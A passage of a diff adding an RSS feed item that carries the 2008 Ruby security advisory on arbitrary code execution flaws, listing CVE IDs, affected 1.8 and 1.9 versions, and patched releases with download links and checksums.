+condition or allow execution of arbitrary code.&lt;/p&gt; &lt;h2&gt;&lt;a name=&quot;label-0&quot; id=&quot;label-0&quot;&gt;Impact&lt;/a&gt;&lt;/h2&gt;&lt;!-- RDLabel: &quot;Impact&quot; --&gt;&lt;p&gt;With the following vulnerabilities, an attacker can lead to denial of
+service condition or execute arbitrary code.&lt;/p&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-2662&quot;&gt;CVE-2008-2662&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-2663&quot;&gt;CVE-2008-2663&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-2725&quot;&gt;CVE-2008-2725&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-2726&quot;&gt;CVE-2008-2726&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-2664&quot;&gt;CVE-2008-2664&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;h2&gt;&lt;a name=&quot;label-1&quot; id=&quot;label-1&quot;&gt;Vulnerable versions&lt;/a&gt;&lt;/h2&gt;&lt;!-- RDLabel: &quot;Vulnerable versions&quot; --&gt;&lt;dl&gt;
+&lt;dt&gt;&lt;a name=&quot;label-2&quot; id=&quot;label-2&quot;&gt;1.8 series&lt;/a&gt;&lt;/dt&gt;&lt;!-- RDLabel: &quot;1.8 series&quot; --&gt;
+&lt;dd&gt;
+&lt;ul&gt;
+&lt;li&gt;1.8.4 and all prior versions&lt;/li&gt;
+&lt;li&gt;1.8.5-p230 and all prior versions&lt;/li&gt;
+&lt;li&gt;1.8.6-p229 and all prior versions&lt;/li&gt;
+&lt;li&gt;1.8.7-p21 and all prior versions&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/dd&gt;
+&lt;dt&gt;&lt;a name=&quot;label-3&quot; id=&quot;label-3&quot;&gt;1.9 series&lt;/a&gt;&lt;/dt&gt;&lt;!-- RDLabel: &quot;1.9 series&quot; --&gt;
+&lt;dd&gt;
+&lt;ul&gt;
+&lt;li&gt;1.9.0-1 and all prior versions&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/dd&gt;
+&lt;/dl&gt;&lt;h2&gt;&lt;a name=&quot;label-4&quot; id=&quot;label-4&quot;&gt;Solution&lt;/a&gt;&lt;/h2&gt;&lt;!-- RDLabel: &quot;Solution&quot; --&gt;&lt;dl&gt;
+&lt;dt&gt;&lt;a name=&quot;label-5&quot; id=&quot;label-5&quot;&gt;1.8 series&lt;/a&gt;&lt;/dt&gt;&lt;!-- RDLabel: &quot;1.8 series&quot; --&gt;
+&lt;dd&gt;
+Please upgrade to 1.8.5-p231, or 1.8.6-p230, or 1.8.7-p22. 
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;ftp://ftp.ruby-lang.org/pub/ruby/1.8/ruby-1.8.5-p231.tar.gz&quot;&gt;&amp;lt;URL:ftp://ftp.ruby-lang.org/pub/ruby/1.8/ruby-1.8.5-p231.tar.gz&amp;gt;&lt;/a&gt;
+      (md5sum: e900cf225d55414bffe878f00a85807c)&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;ftp://ftp.ruby-lang.org/pub/ruby/1.8/ruby-1.8.6-p230.tar.gz&quot;&gt;&amp;lt;URL:ftp://ftp.ruby-lang.org/pub/ruby/1.8/ruby-1.8.6-p230.tar.gz&amp;gt;&lt;/a&gt;
+      (md5sum: 5e8247e39be2dc3c1a755579c340857f)&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;ftp://ftp.ruby-lang.org/pub/ruby/1.8/ruby-1.8.7-p22.tar.gz&quot;&gt;&amp;lt;URL:ftp://ftp.ruby-lang.org/pub/ruby/1.8/ruby-1.8.7-p22.tar.gz&amp;gt;&lt;/a&gt;
+      (md5sum: fc3ede83a98f48d8cb6de2145f680ef2)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/dd&gt;
+&lt;dt&gt;&lt;a name=&quot;label-6&quot; id=&quot;label-6&quot;&gt;1.9 series&lt;/a&gt;&lt;/dt&gt;&lt;!-- RDLabel: &quot;1.9 series&quot; --&gt;
+&lt;dd&gt;
+Please upgrade to 1.9.0-2.
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;ftp://ftp.ruby-lang.org/pub/ruby/1.9/ruby-1.9.0-2.tar.gz&quot;&gt;&amp;lt;URL:ftp://ftp.ruby-lang.org/pub/ruby/1.9/ruby-1.9.0-2.tar.gz&amp;gt;&lt;/a&gt;
+      (md5sum: 2a848b81ed1d6393b88eec8aa6173b75)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/dd&gt;
+&lt;/dl&gt;&lt;p&gt;These versions also fix the vulnerability of WEBrick (&lt;a href=&quot;http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-1891&quot;&gt;CVE-2008-1891&lt;/a&gt;).&lt;/p&gt;&lt;p&gt;Please note that a package that corrects this weakness may already be
+available through your package management software.&lt;/p&gt;&lt;h2&gt;&lt;a name=&quot;label-7&quot; id=&quot;label-7&quot;&gt;Credit&lt;/a&gt;&lt;/h2&gt;&lt;!-- RDLabel: &quot;Credit&quot; --&gt;&lt;p&gt;Credit to Drew Yao of Apple Product Security for disclosing the problem to Ruby
+Security Team.&lt;/p&gt;&lt;h2&gt;&lt;a name=&quot;label-8&quot; id=&quot;label-8&quot;&gt;Changes&lt;/a&gt;&lt;/h2&gt;&lt;!-- RDLabel: &quot;Changes&quot; --&gt;&lt;ul&gt;
+&lt;li&gt;2008-06-21 00:29 +09:00  removed wrong CVE IDs (CVE-2008-2727, CVE-2008-2728).&lt;/li&gt;
+&lt;/ul&gt;</description>
+          <pubDate>Fri, 20 Jun 2008 12:54:43 GMT</pubDate>
+          <guid>http://www.ruby-lang.org/en/news/2008/06/20/arbitrary-code-execution-vulnerabilities/</guid>
+          <link>http://www.ruby-lang.org/en/news/2008/06/20/arbitrary-code-execution-vulnerabilities/</link>
+        </item>
+
+
+  </channel>
+</rss>
